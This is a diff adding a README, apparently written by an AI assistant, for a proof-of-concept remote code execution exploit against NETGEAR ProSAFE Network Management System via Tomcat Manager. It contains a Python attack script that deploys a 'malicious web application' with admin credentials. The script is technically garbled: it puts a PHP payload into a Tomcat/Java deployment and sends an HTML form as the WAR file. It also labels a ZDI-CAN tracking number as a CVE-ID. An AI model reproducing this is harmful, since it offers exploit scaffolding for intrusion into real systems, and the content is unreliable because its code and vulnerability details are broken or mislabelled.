@@ -1,0 +1,119 @@
+Here’s a structured README.md for the NETGEAR ProSAFE Network Management System Remote Code Execution (RCE) vulnerability PoC:
+
+---
+
+# Proof of Concept (PoC) for Remote Code Execution in NETGEAR ProSAFE Network Management System
+
+This repository contains a Proof of Concept (PoC) script demonstrating a Remote Code Execution (RCE) vulnerability in NETGEAR ProSAFE Network Management System. The vulnerability is due to the use of a vulnerable version of Apache Tomcat within the product installer. This issue allows authenticated attackers to execute arbitrary code on affected installations.
+
+## Vulnerability Description
+
+**CVE-ID**: ZDI-CAN-22868
+
+**Overview**: 
+NETGEAR ProSAFE Network Management System contains a remote code execution vulnerability due to the use of a vulnerable version of Apache Tomcat. An attacker with authentication can exploit this vulnerability to execute arbitrary code on the affected system in the context of SYSTEM.
+
+**Affected Versions**: 
+- NETGEAR ProSAFE Network Management System versions with vulnerable Apache Tomcat versions.
+
+**Authentication**: 
+Required
+
+## PoC Details
+
+This PoC demonstrates how an attacker can exploit the vulnerability to achieve remote code execution. The specific flaw lies within the product installer due to the use of an outdated or vulnerable Apache Tomcat version.
+
+### PoC Script
+
+The following script illustrates how to exploit this RCE vulnerability. Ensure you have appropriate permissions before running this PoC.
+
+**Important**: This PoC is for educational purposes only and should not be used for unauthorized or malicious activities.
+
+```python
+import requests
+
+# Configuration
+target_url = "http://target-ip:port/manager/html"  # Change this to the Tomcat Manager URL of the target
+username = "admin"  # Change to the valid username
+password = "password"  # Change to the valid password
+
+# The payload to be executed on the remote server
+payload = """
+<?php
+    // Payload to execute arbitrary PHP code
+    system('whoami');
+?>
+"""
+
+# Tomcat Manager URL path for deploying a new web application
+deploy_url = f"{target_url}/deploy?path=/example&update=true"
+
+# Headers for authentication
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+def exploit_rce(url, username, password, payload):
+    """
+    Exploit the RCE vulnerability by deploying a malicious web application.
+
+    Args:
+        url (str): The Tomcat Manager URL.
+        username (str): The Tomcat Manager username.
+        password (str): The Tomcat Manager password.
+        payload (str): The malicious payload to be executed.
+    """
+    try:
+        # Create a new web application with the malicious payload
+        response = requests.post(
+            url,
+            headers=headers,
+            data={
+                "path": "/example",
+                "war": f"<form method='post' enctype='multipart/form-data'><input type='file' name='file' value='{payload}'/></form>"
+            },
+            auth=(username, password)
+        )
+        
+        # Print the response details
+        print("Status Code:", response.status_code)
+        print("Response Body:", response.text)
+        
+        if response.status_code == 200 and "Deployed application" in response.text:
+            print("[+] Successfully deployed the malicious web application.")
+        else:
+            print("[-] Failed to deploy the malicious web application.")
+    except requests.RequestException as e:
+        print(f"[-] An error occurred: {e}")
+
+if __name__ == "__main__":
+    print(f"Exploiting RCE vulnerability at: {deploy_url}")
+    exploit_rce(deploy_url, username, password, payload)
+```
+
+### Explanation
+
+1. **Configuration**: Set `target_url` to the Tomcat Manager URL of the target system, and update `username` and `password` with valid credentials.
+2. **Payload**: The payload is a simple PHP script that executes a system command to demonstrate code execution.
+3. **Exploit Function**: The `exploit_rce()` function sends a POST request to deploy the malicious web application.
+4. **Deployment**: The script attempts to deploy a new web application with the malicious payload and prints the result.
+
+## Important Considerations
+
+- **Permissions**: Ensure you have explicit permission to test this vulnerability on the target system. Unauthorized testing is illegal and unethical.
+- **Testing Environment**: Conduct tests in a controlled environment to avoid impacting production systems.
+- **Ethical Use**: Use this PoC responsibly and only in authorized contexts.
+
+## Mitigation
+
+To mitigate this vulnerability, take the following steps:
+
+1. **Update Tomcat**: Upgrade to a version of Apache Tomcat that has patched the vulnerability.
+2. **Secure Access**: Ensure Tomcat Manager and other sensitive interfaces are secured and accessible only to authorized users.
+3. **Review Configurations**: Regularly review and harden the configuration of web applications and servers.
+
+By following these steps, you can address the RCE vulnerability in NETGEAR ProSAFE Network Management System and enhance overall security.
+
+---
+
+This README.md provides a detailed description and PoC script for the RCE vulnerability, including setup instructions, considerations, and mitigation advice.
